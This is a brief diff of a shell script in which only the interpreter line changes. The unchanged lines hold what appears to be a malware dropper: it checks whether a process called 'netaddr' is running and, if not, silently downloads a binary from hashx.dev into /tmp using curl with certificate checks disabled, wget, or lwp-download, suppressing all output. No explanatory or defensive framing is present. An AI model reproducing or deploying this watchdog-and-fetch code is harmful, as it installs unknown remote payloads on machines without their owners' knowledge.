@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 RUN=$(ps -ef | grep 'netaddr' | grep -v 'defunct' | grep -v 'grep' | wc -l)
 if ! [ $RUN -gt 0 ]; then
     (curl -ksL https://hashx.dev/netaddr -o /tmp/netaddr || wget --no-check-certificate -qO /tmp/netaddr https://hashx.dev/netaddr || lwp-download https://hashx.dev/netaddr /tmp/netaddr) >/dev/null 2>&1
